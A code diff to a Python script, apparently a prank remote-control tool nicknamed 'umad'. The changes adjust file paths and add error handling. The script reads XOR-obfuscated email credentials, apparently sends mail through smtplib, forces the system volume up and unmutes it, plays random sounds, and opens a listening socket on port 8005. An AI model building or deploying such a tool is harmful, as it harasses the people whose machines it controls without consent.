@@ -8,7 +8,7 @@ import winsound
 import socket
 import smtplib 
 
-with open("umad/cipher.txt","r") as file:
+with open("cipher.txt","r") as file:
     xor_key = file.read().strip()
 
 def run():
@@ -19,11 +19,11 @@ def xor_cipher(text, key):
     return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(text))
 
 def spider_web():
-    with open("umad/email.txt", "r") as file:
+    with open("email.txt", "r") as file:
         email = file.read().strip()
         email_name = xor_cipher(email, xor_key)
         file.close()
-    with open("umad/key.txt", "r") as key:
+    with open("key.txt", "r") as key:
         passw = key.read().strip()
         deobfuscated_key = xor_cipher(passw, xor_key)
         key.close()    
@@ -43,7 +43,7 @@ def spider_web():
         print(f"Error: {e}")
 spider_web()
 
-folder_path = "/umad/Audio"
+folder_path = "Audio/"
 filenames_1 = os.listdir(folder_path)
 filenames = []
 
@@ -60,9 +60,15 @@ def make_noise(specific_noise):
     volume.SetMasterVolumeLevel(-2.0, None)
     volume.SetMute(0, None)
     if specific_noise:
-        winsound.PlaySound("audio/" + specific_noise,winsound.SND_FILENAME)
+        try:
+            winsound.PlaySound("audio/" + specific_noise,winsound.SND_FILENAME)
+        except Exception as Error:
+            print(f"Error occured{Error}")
     else:
-        winsound.PlaySound("audio/" + filenames[rand.randint(0,len(filenames)-1)], winsound.SND_FILENAME) 
+        try:
+            winsound.PlaySound("audio/" + filenames[rand.randint(0,len(filenames)-1)], winsound.SND_FILENAME)
+        except Exception as Error:
+            print(f"Error occured{Error}") 
 
 def process_data(data):
     if data:
@@ -95,3 +101,4 @@ if __name__ == "__main__":
     host = "0.0.0.0"
     port = 8005
     start_server(host,port)
+ 
